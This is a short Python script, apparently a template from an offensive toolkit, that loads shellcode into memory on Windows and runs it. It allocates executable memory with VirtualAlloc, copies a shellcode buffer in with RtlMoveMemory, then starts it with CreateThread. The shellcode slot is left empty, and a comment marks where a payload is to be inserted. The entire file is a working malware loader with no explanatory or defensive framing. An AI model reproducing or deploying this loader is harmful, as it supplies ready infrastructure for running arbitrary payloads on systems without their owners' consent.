import ctypes

shellcode = (
);
#Dont Add any '(' symbol before this line  !!!!!!
ptr = ctypes.windll.kernel32.VirtualAlloc(0,4096,ctypes.c_int(0x1000),ctypes.c_int(0x40))

b = bytearray()

b.extend(map(ord, shellcode))

buf = (ctypes.c_char * len(shellcode)).from_buffer(b)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
					buf,
					ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
					ctypes.c_int(0),
					ctypes.c_int(ptr),
					ctypes.c_int(0),
					ctypes.c_int(0),
					ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
